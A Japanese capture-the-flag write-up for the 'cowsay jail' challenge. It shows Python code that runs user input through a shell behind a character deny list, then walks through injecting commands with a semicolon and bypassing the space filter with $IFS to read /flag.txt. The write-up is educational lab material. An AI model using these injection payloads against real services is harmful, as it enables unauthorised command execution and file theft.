# cowsay jail

Daily AlpacaHack愛好家としてはやっぱりcowsayよりalpacasayが欲しいところですよね(？)

## 問題

`cowsay`コマンドは文字列を強調できる素敵なコマンドです！

🦙 < フラグは /flag.txt にあるパカ
```py
deny_list = ["\t", " ", "-", "'", '"', "`", "(", ")", "<", ">", "&", "|"]
denied_characters = [c for c in deny_list if c in argument]
if len(denied_characters) > 0:
    raise SystemExit(f"The argument contains at least 1 denied character(s): {denied_characters}")

subprocess.run(
    f"cowsay {argument}",
    shell=True,
    stdin=subprocess.DEVNULL,  # no input
)
```

## 概要

実際に`cowsay`コマンドを使ってみるとこんな感じになりました。
```
$ cowsay hello
 _______
< hello >
 -------
        \   ^__^
         \  (oo)\_______
            (__)\       )\/\
                ||----w |
                ||     ||
```
なるほど、牛が言っているような感じになるから`cow`+`say`なのですね。

さて、今回の問題の目標はこのコマンドに引数を与えて`/flag.txt`の内容を表示することです。

かなりたくさんの記号文字が潰されていますが、どんな引数を与えればいいのでしょうか？

## 解法

### Step1 他のコマンドを実行する

素直に`cowsay`コマンドを実行するだけではフラグは得られません。

`cat`などの別のコマンドを実行する必要があります。

この問題では`subprocess.run`に`shell=True`がついているので、コマンドインジェクションできそうです。

入力チェックで`|`（パイプ）は弾かれてしまいますが、`;`（セミコロン）は禁止リストに入っていないので、いったんこれで試してみましょう。
```
$ nc localhost 1337
$ cowsay hello;pwd;ls
 _______
< hello >
 -------
        \   ^__^
         \  (oo)\_______
            (__)\       )\/\
                ||----w |
                ||     ||
/app
jail.py
```
ちゃんとセミコロンにつづく`pwd`と`ls`が実行されているようです。

この調子で
```
$ cowsay hello;cat /flag.txt
```
といきたいところですが、空白やタブ文字が弾かれてしまいます。

かといって、`cat/flag.txt`のようにつなげて書くことはできません。

なんとかして空白やタブ文字を使わずに`cat`と`/flag.txt`を分ける必要があります。

### Step2 コマンドと引数を分ける

いわゆる空白文字にあたる`0x1c`とか`0xa0`とかいろいろ試してみましたがすべてダメでした。

それなら、`hello;sh`ではどうでしょうか？シェルを起動できればあとは自由にできますからね。

しかし、残念ながらこれもダメです。これを潰すための`stdin=subprocess.DEVNULL`なのでしょう。

何かいい方法はないかと思い調べてみると、`$IFS`を使うと良いことがわかりました。

この`IFS`は、デフォルトで空白やタブなどの区切り文字が格納されている変数です。

これを`$IFS`のように`$`をつけてと書くと、その場で展開されるので結果的に区切り文字になります。

`$`は禁止文字に含まれていないので入力することができます。

※もしそのあとに文字が続く場合は`${IFS}`のように`{ }`で囲むと良いですが、今回は必要ありません。

よって、
```
$ cowsay hello;cat$IFS/flag.txt
```
のように入力すると、フラグを得ることができました。
